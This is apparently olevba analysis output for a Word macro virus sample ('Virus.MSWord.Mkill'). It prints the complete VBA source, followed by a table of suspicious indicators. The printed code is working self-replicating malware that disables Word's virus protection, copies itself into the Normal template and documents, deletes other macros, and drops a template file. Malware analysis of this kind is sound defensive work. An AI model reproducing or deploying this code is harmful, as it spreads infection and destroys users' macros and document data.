olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mkill-ad2429c1efb4c25804143509663949769f9f3e18
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mkill-ad2429c1efb4c25804143509663949769f9f3e18 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim A1, A2, A3, A4 As Boolean
Dim A5, A6 As Object
Dim A7, A8, A16 As Integer
Dim A10, A11, A12, A13, A14 As String
Rem :-D you are marked!.it's just shit
Const A15 = "I Love Amon"
Private Sub Document_Open()
On Error Resume Next
jest
Set A5 = ActiveDocument.VBProject.VBComponents.Item(1)
Set A6 = NormalTemplate.VBProject.VBComponents.Item(1)
A3 = A5.CodeModule.Find(A15, 1, 1, 100, 100)
A4 = A6.CodeModule.Find(A15, 1, 1, 100, 100)
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
If A4 = False Then
    A6.CodeModule.DeleteLines 1, A6.CodeModule.CountOfLines
End If
If A3 = False Then
        A5.CodeModule.DeleteLines 1, A5.CodeModule.CountOfLines
End If
End Sub
Private Sub Document_Close()
On Error Resume Next
jest
Set A5 = ActiveDocument.VBProject.VBComponents.Item(1)
Set A6 = NormalTemplate.VBProject.VBComponents.Item(1)
A3 = A5.CodeModule.Find(A15, 1, 1, 100, 100)
A4 = A6.CodeModule.Find(A15, 1, 1, 100, 100)
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
If (A3 = True Xor A4 = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
      If A3 = True Then
        A2 = NormalTemplate.Saved
        A11 = A5.CodeModule.Lines(1, A5.CodeModule.CountOfLines)
        A6.CodeModule.DeleteLines 1, A6.CodeModule.CountOfLines
        A6.CodeModule.AddFromString A11
        With Dialogs(wdDialogFileSummaryInfo): .Title = "": .Subject = "": .Author = "": .Category = "": .Keywords = "": .Comments = "": .Execute: End With
        If A2 = True Then NormalTemplate.Save
      End If
    If A4 = True Or ActiveDocument.Saved = False Then
     A1 = ActiveDocument.Saved
     A11 = A6.CodeModule.Lines(1, A6.CodeModule.CountOfLines)
     A5.CodeModule.DeleteLines 1, A5.CodeModule.CountOfLines
     A5.CodeModule.AddFromString A11
     With Dialogs(wdDialogFileSummaryInfo): .Title = "": .Subject = "": .Author = "": .Category = "": .Keywords = "": .Comments = "": .Execute: End With
     If A1 = True Then ActiveDocument.Save
   End If
End If
End Sub
Private Sub Document_new()
On Error Resume Next
jest
Set A5 = ActiveDocument.VBProject.VBComponents.Item(1)
Set A6 = NormalTemplate.VBProject.VBComponents.Item(1)
A3 = A5.CodeModule.Find(A15, 1, 1, 100, 100)
A4 = A6.CodeModule.Find(A15, 1, 1, 100, 100)
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
If A4 = False Then
    A6.CodeModule.DeleteLines 1, A6.CodeModule.CountOfLines
End If
If A3 = False Then
        A5.CodeModule.DeleteLines 1, A5.CodeModule.CountOfLines
End If
End Sub
Private Function jest()
Dim DelFlag As Boolean
Dim DocAmon, TempAmon, DocAmonL, TempAmonL As Boolean
Dim i, x As Integer
Dim MacroNames As String
On Error GoTo Getout
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
DocAmon = False
TempAmon = False
DocAmonL = False
TempAmonL = False
DelFlag = True
Do While (DelFlag)
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
MacroNames = ActiveDocument.VBProject.VBComponents(i).Name
    If MacroNames <> "AmonClean" And MacroNames <> "ThisDocument" Then
     Application.OrganizerDelete Source:=ActiveDocument.FullName, _
     Name:=MacroNames, Object:=wdOrganizerObjectProjectItems
     DelFlag = True
     MsgBox "Find Micro [" & MacroNames & "] ,I shall kill it!" _
    , vbCritical, "Micro Virus Killer Ver. 1.2"
     Exit For
     Else
     DelFlag = False
    End If
Next
Loop
DelFlag = True
Do While (DelFlag)
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
MacroNames = NormalTemplate.VBProject.VBComponents(i).Name
    If MacroNames <> "AmonClean" And MacroNames <> "ThisDocument" Then
     Application.OrganizerDelete Source:=NormalTemplate.FullName, _
     Name:=MacroNames, Object:=wdOrganizerObjectProjectItems
     DelFlag = True
     MsgBox "Find Micro [" & MacroNames & "] ,I shall kill it!" _
    , vbCritical, "Micro Virus Killer Ver. 1.2"
     Exit For
     Else
     DelFlag = False
    End If
Next
Loop
For x = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(x).Name = "AmonClean" Then
       TempAmon = True
       If NormalTemplate.VBProject.VBComponents(x).CodeModule.CountOfLines < 50 Then
       TempAmonL = True
       End If
    End If
Next
For x = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(x).Name = "AmonClean" Then
       DocAmon = True
        If ActiveDocument.VBProject.VBComponents(x).CodeModule.CountOfLines < 50 Then
        DocAmonL = True
        End If
    End If
Next
If DocAmonL = True Then
    DocAmon = False
     Application.OrganizerDelete Source:=ActiveDocument.FullName, _
     Name:="AmonClean", Object:=wdOrganizerObjectProjectItems
    End If
If TempAmonL = True Then
    TempAmon = False
     Application.OrganizerDelete Source:=NormalTemplate.FullName, _
     Name:="AmonClean", Object:=wdOrganizerObjectProjectItems
    End If
  If DocAmon = False And TempAmon = False Then
    Application.OrganizerCopy Source:=Options.DefaultFilePath(6) & "\MicroKiller.dot", _
    Destination:=NormalTemplate.FullName, Name:="AmonClean", _
    Object:=wdOrganizerObjectProjectItems
     Application.OrganizerCopy Source:=Options.DefaultFilePath(6) & "\MicroKiller.dot", _
    Destination:=ActiveDocument.FullName, Name:="AmonClean", _
    Object:=wdOrganizerObjectProjectItems
    DocAmon = True
    TempAmon = True
  End If
 If DocAmon = False Then
    Application.OrganizerCopy Source:=NormalTemplate.FullName, _
    Destination:=ActiveDocument.FullName, Name:="AmonClean", _
    Object:=wdOrganizerObjectProjectItems
    Temo
     End If
 If TempAmon = False Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, _
    Destination:=NormalTemplate.FullName, Name:="AmonClean", _
    Object:=wdOrganizerObjectProjectItems
   Temo
   End If
Getout:
 End Function
Private Function Temo()
Dim a, c As String
Dim b As Long
On Error GoTo Getout
c = Dir(Options.DefaultFilePath(6) & "\MicroKiller.dot")
If c = "" Then
a = ActiveDocument.FullName
b = ActiveDocument.SaveFormat
ActiveDocument.SaveAs FileName:=Options.DefaultFilePath(6) & "\MicroKiller.dot", FileFormat:=wdFormatDocument, AddToRecentFiles:=False
ActiveDocument.SaveAs FileName:=a, FileFormat:=b, AddToRecentFiles:=False
End If
Getout:
End Function











































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_new        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|kill                |May delete a file                            |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

